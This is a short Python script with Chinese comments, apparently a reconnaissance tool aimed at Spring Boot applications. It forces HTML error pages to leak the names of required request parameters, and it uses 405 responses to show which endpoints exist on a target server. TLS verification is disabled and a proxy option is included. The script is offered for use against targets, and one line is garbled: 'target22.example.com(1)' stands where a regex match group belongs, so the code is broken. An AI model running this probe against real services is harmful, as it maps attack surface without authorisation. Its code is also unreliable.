#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Spring Boot 参数名 oracle：Accept: text/html 触发 Whitelabel Error Page，
该页在只启用 @RequestParam 的接口上会回显 Required String parameter 'X' is not present ——
即使业务异常处理器把 JSON 错误信息吞成 {"code":0,"msg":"ERROR"} 也照样泄露真实参数名。
同时可判定接口是否存在（未命中映射时返回应用自己的全局兜底响应）。

用法：
  python spring_param_oracle.py <base_url> <path>
例：
  python spring_param_oracle.py http://target:8081 /data/api/confirmRelation
"""
import re, sys, requests
requests.packages.urllib3.disable_warnings()

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8081"
PATH = sys.argv[2] if len(sys.argv) > 2 else "/data/api/confirmRelation"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120"

s = requests.Session(); s.trust_env = False
# 若需走代理：s.proxies = {"http": "http://127.0.0.1:7892", "https": "http://127.0.0.1:7892"}

for method in ("GET", "POST"):
    try:
        r = s.request(method, BASE + PATH, headers={"User-Agent": UA, "Accept": "text/html"},
                      timeout=12, verify=False, allow_redirects=False)
    except Exception as e:
        print("%-4s ERR %s" % (method, e)); continue
    body = r.content.decode("utf-8", "replace")
    print("%-4s %s len=%d" % (method, r.status_code, len(r.content)))
    # 判据 1：Whitelabel Error Page 里回显的缺失参数名
    for pat in (r"parameter &#39;([^&]+)&#39; is not present",
                r"parameter '([^']+)' is not present"):
        m = re.search(pat, body)
        if m:
            print("   >>> 必需参数名 = %s" % target22.example.com(1))
            break
    # 判据 2：405 说明映射存在但方法不对；405 页同样带 Whitelabel
    if r.status_code == 405:
        print("   >>> 映射存在，该路径只接受其它 HTTP 方法（多为 POST）")
    if "Whitelabel Error Page" not in body:
        print("   body: %s" % body[:200].replace("\n", " "))
